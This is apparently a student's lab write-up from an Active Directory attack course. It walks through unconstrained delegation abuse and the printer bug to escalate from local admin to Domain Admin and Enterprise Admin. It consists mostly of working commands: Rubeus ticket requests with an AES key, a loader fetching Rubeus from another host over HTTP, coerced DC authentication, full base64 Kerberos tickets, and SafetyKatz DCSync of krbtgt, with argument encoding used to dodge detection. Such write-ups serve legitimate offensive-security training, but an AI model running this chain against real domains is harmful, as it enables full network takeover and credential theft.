# 🖨️ Unconstrained Delegation to DA to Entreprise Admin through printer bug

first we need to find a server that has unconstrained delegation enabled ->

```
. C:\AD\Tools\PowerView.ps1 
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Since the prerequisite for elevation using Unconstrained delegation is having admin access to the machine, we need to compromise a user which has local admin access on appsrv. Recall that we extracted secrets of appadmin, srvadmin and websvc from dcorp-adminsrv. Let's check if anyone of them have local admin privileges on dcorp-appsrv.

Let's first try with appadmin, first use ArgSplit to encode "asktgt"->

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

In the new process, let's run those commands ->

```
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local
```

Perfect, it's a hit with appadmin:

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now we need to copy Rubeus to dcorp-appsrv to abuse Printer Bug ->

```
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe /Y
```

Perfect, rubeus is on appsrv:

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now, with argsplit let's encode "monitor" and copy that on the side while we get a shell on appsrv ->

```
winrs -r:dcorp-appsrv cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.13 
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/Rubeus.exe -args %Pwn% /targetuser:DCORP-DC$ /interval:5 /nowrap C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

Note that i did not do this way, i hosted a python server using wsl to go and fetch rubeus on my local machine to set up my listener ->

```
C:\Users\Public\Loader.exe -path http://172.16.100.13:5454/Rubeus.exe -args %Pwn% /targetuser:DCORP-DC$ /interval:5 /nowrap C:\Users\Public\Rubeus.exe monitor /targetuser:DCORP-DC$ /interval:5 /nowrap
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

we can note that we set %Pwn% to monitor on the appsrv machine

Now that our listener is set, let's hop on the studen VM and launch the follwoing command ->

```
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and we got the TGT of dcorp-dc$

here is the ticket (in base 64)

```
doIGRTCCBkGgAwIBBaEDAgEWooIFGjCCBRZhggUSMIIFDqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBLYwggSyoAMCARKhAwIBAqKCBKQEggSggYiwdNGHMrKWHPgGhJ05gDO4LcGEgpRViXW+EmEqD1omGbEnFG5p27zW3W2GTlqopJ8Spla2H12l8w9eK1Q7C8yKwlxZrFffcV1UR3x36/cnmX4S9EnyO3MM91QOMoEXO92skD6aR7tRHyWglCQNXiVPBiiUoMv5OMqOhsSQ8RU5yo8A56dvj0tFsLkh+FF5J5n/+jtnqEHQmeAfy6K6WGFY8rm5XUqw07u3az5zPbAktyWGxmfmlJJLcuO3WZ218Hv79voxoCOE5q1XF4ffoyHWnlXMCfE0M9eEt0CXKQnF02X8T7HSMBNZ5EelqcWp6xTJXxdOToQkh8FDharBiVHKO3M/9qHNHPBejDuxqX8YgXsGn3JtpCiUr8c4GGnvcUC6eOMSR1NJkH1KbJiS29x8oo1cEeikswYO2Fo7QfvfJ89zqQuXv3hjsN/T9UtedqHz485+Qwb5mYg4lJUK7L9c4mOqFJkEysRqSBZXaRBT7lNNCMEfR4Qs1VVGt16ugNB7gn5wrGR+JhRIXzocEN2+TpgDytacu0/1a7uMVv92FDWnEs7HRDfraPra0EbzB6ZXBeA4JhhaVdPvszSnSCDdZxLMXozOerdJiNAhmJC4Ja91OCUCKcmYB1qJcU0/EeO5ABh3UQsVXQf21MyeNmraSYBVAFashLDt7RStajYwNdfuqVob6o6fimThyOj4+e4oIwEBePOQzORIVlc9C8Q4by1SXPBreW5yW59yjdx9xFNN5Zv6J2tgmD17MJMCfsD6SkEMgi4lGJrm+2rNxbUsj0oDhzGUQuzW0ZjXo1ruQee/T3a3+ovQEzHJM8QIIVk/KdER5ILqh4pb0OlzeWkMtHTknlmc7bYq0y0bnIxiTNmyZ2emVMDyAUpzyoQp0vqspr6okIyLX6RQtbF1Rb6mmLiZMc6YkSzYgkBt1cLHJ8Yxvwwog1OtdFd8/8E5brXSIw2hxrb3EAYGNVASU4vdPHtBsR8WLdNFnHBUOvqVoUX22qFSMNq4fpP/XohyxN7zmKepYwgwhB6Quxw39GJpL08HurfuxNwzuXVQCIAjSSBRl0+pSAmw3CrP3V+PEb2ONWY07BHyPCKpvEyCau5cG7RCPLdq0P5NvVUVhUUIfmDoixsPVy62eKB5bn9E/6SCUvHq6FKCFlSgHSYQL8hif6TtB/Q9aVODNNPxLARxUfGokv2Iq19746fQgJu61AEkSJUyY2S4MLGO3XkiHYf3g8zzyJv1gm0NaN8yUCnuNJkOlMgftCoXJ16f8U2GB8ZEpGanSg7Ft23tcX0yTk7rKsRv7r0aPd5yuq8c+bUpWcVOUdK2FTrDE7IPdlaNAA6ztkNLYA9raKQIGnp0VUbafFrFBEP51GZAkGXUY1XWc6WI5P+yBK5zRtkEtRA/JsPmdMQsYaaHA/96eY5OQNK9p/NV72kwRkG3pvTgKNm8REPsRkOrYL0RkGn30OxZwqu8UBvI2Ug+g9+lrGeR4GqePNzxG0lqqtZSfpEPZaypN16fYFccKvNoLInqQt4UXApST4gPzzj14cVok3f3QjoQP/0g0RDrmmjtpqvxJMWjggEVMIIBEaADAgEAooIBCASCAQR9ggEAMIH9oIH6MIH3MIH0oCswKaADAgESoSIEIMtfKFNTyqWI36TiT9g/mT4SVC20jKXUieh+98vLqxkcoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMohYwFKADAgEBoQ0wCxsJRENPUlAtREMkowcDBQBgoQAApREYDzIwMjQwNjE4MDUwMTUxWqYRGA8yMDI0MDYxODE1MDEzMFqnERgPMjAyNDA2MjUwNTAxMzBaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTA==
```

So now we can encode "ptt" with ArgSplit  and run the following ->

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket:doIGRTCCBkGgAwIBBaEDAgEWooIFGjCCBRZhggUSMIIFDqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBLYwggSyoAMCARKhAwIBAqKCBKQEggSggYiwdNGHMrKWHPgGhJ05gDO4LcGEgpRViXW+EmEqD1omGbEnFG5p27zW3W2GTlqopJ8Spla2H12l8w9eK1Q7C8yKwlxZrFffcV1UR3x36/cnmX4S9EnyO3MM91QOMoEXO92skD6aR7tRHyWglCQNXiVPBiiUoMv5OMqOhsSQ8RU5yo8A56dvj0tFsLkh+FF5J5n/+jtnqEHQmeAfy6K6WGFY8rm5XUqw07u3az5zPbAktyWGxmfmlJJLcuO3WZ218Hv79voxoCOE5q1XF4ffoyHWnlXMCfE0M9eEt0CXKQnF02X8T7HSMBNZ5EelqcWp6xTJXxdOToQkh8FDharBiVHKO3M/9qHNHPBejDuxqX8YgXsGn3JtpCiUr8c4GGnvcUC6eOMSR1NJkH1KbJiS29x8oo1cEeikswYO2Fo7QfvfJ89zqQuXv3hjsN/T9UtedqHz485+Qwb5mYg4lJUK7L9c4mOqFJkEysRqSBZXaRBT7lNNCMEfR4Qs1VVGt16ugNB7gn5wrGR+JhRIXzocEN2+TpgDytacu0/1a7uMVv92FDWnEs7HRDfraPra0EbzB6ZXBeA4JhhaVdPvszSnSCDdZxLMXozOerdJiNAhmJC4Ja91OCUCKcmYB1qJcU0/EeO5ABh3UQsVXQf21MyeNmraSYBVAFashLDt7RStajYwNdfuqVob6o6fimThyOj4+e4oIwEBePOQzORIVlc9C8Q4by1SXPBreW5yW59yjdx9xFNN5Zv6J2tgmD17MJMCfsD6SkEMgi4lGJrm+2rNxbUsj0oDhzGUQuzW0ZjXo1ruQee/T3a3+ovQEzHJM8QIIVk/KdER5ILqh4pb0OlzeWkMtHTknlmc7bYq0y0bnIxiTNmyZ2emVMDyAUpzyoQp0vqspr6okIyLX6RQtbF1Rb6mmLiZMc6YkSzYgkBt1cLHJ8Yxvwwog1OtdFd8/8E5brXSIw2hxrb3EAYGNVASU4vdPHtBsR8WLdNFnHBUOvqVoUX22qFSMNq4fpP/XohyxN7zmKepYwgwhB6Quxw39GJpL08HurfuxNwzuXVQCIAjSSBRl0+pSAmw3CrP3V+PEb2ONWY07BHyPCKpvEyCau5cG7RCPLdq0P5NvVUVhUUIfmDoixsPVy62eKB5bn9E/6SCUvHq6FKCFlSgHSYQL8hif6TtB/Q9aVODNNPxLARxUfGokv2Iq19746fQgJu61AEkSJUyY2S4MLGO3XkiHYf3g8zzyJv1gm0NaN8yUCnuNJkOlMgftCoXJ16f8U2GB8ZEpGanSg7Ft23tcX0yTk7rKsRv7r0aPd5yuq8c+bUpWcVOUdK2FTrDE7IPdlaNAA6ztkNLYA9raKQIGnp0VUbafFrFBEP51GZAkGXUY1XWc6WI5P+yBK5zRtkEtRA/JsPmdMQsYaaHA/96eY5OQNK9p/NV72kwRkG3pvTgKNm8REPsRkOrYL0RkGn30OxZwqu8UBvI2Ug+g9+lrGeR4GqePNzxG0lqqtZSfpEPZaypN16fYFccKvNoLInqQt4UXApST4gPzzj14cVok3f3QjoQP/0g0RDrmmjtpqvxJMWjggEVMIIBEaADAgEAooIBCASCAQR9ggEAMIH9oIH6MIH3MIH0oCswKaADAgESoSIEIMtfKFNTyqWI36TiT9g/mT4SVC20jKXUieh+98vLqxkcoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMohYwFKADAgEBoQ0wCxsJRENPUlAtREMkowcDBQBgoQAApREYDzIwMjQwNjE4MDUwMTUxWqYRGA8yMDI0MDYxODE1MDEzMFqnERgPMjAyNDA2MjUwNTAxMzBaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTA==
```

And we can verify that the ticket is in our cache:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and now from this process we can run DCsync ->

```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
DCSync is a technique used to request the passwords of any user from a domain controller through the replication protocol
{% endhint %}

Now we are going to elevate our privileges to Entreprise Admins

To get Enterprise Admin privileges, we need to force authentication from mcorp-dc. Run the below command to listern for mcorp-dc$ tickets on dcorp-appsrv:

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

On our appsrv terminal, let's run the following (don't forget to host a wsl python server to call rubeus) ->

```
C:\Users\Public\Loader.exe -path http://172.16.100.12:5454/Rubeus.exe -args %Pwn% /targetuser:MCORP-DC$ /interval:5 /nowrap C:\Users\Public\Rubeus.exe monitor /targetuser:MCORP-DC$ /interval:5 /nowrap
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now on the student vm, we're going to Use MS-RPRN on the student VM to trigger authentication from mcorp-dc to dcorp-appsrv ->&#x20;

```
C:\AD\Tools\MS-RPRN.exe \\mcorp-dc.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local    
```

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Here is the encoded ticket ->

```
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
```

Let's encode ptt and launch the following attack ->

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /ticket: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
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Now, we can run DCSync from this process, let's encode lsadump::dcsync ->

```
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "%Pwn% /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
```

We are now entreprise admins:

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
